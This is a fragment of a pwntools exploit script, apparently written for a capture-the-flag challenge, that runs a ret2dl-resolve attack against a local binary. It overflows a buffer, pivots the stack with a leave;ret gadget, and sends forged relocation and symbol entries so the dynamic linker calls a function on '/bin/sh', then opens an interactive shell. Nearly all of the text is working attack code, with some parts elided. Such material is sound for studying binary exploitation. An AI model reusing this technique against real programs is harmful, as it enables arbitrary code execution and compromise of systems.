...
p = process(name)
start = 0x804ad00
leave_ret_addr = 0x804851d
payload1 = b"a"*108 + p32(start-20) + p32(0x80483a0) + p32(leave_ret_addr) + p32(0) + p32(start-20) + p32(0x100)
p.recvuntil(b"Welcome to RET_TO_DL~!\n")
p.sendline(payload1)
...
payload2 = p32(0x0) + p32(resolve_plt) + p32(reloc_index) + b"XXXX" + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstr
p.sendline(payload2)
p.interactive()
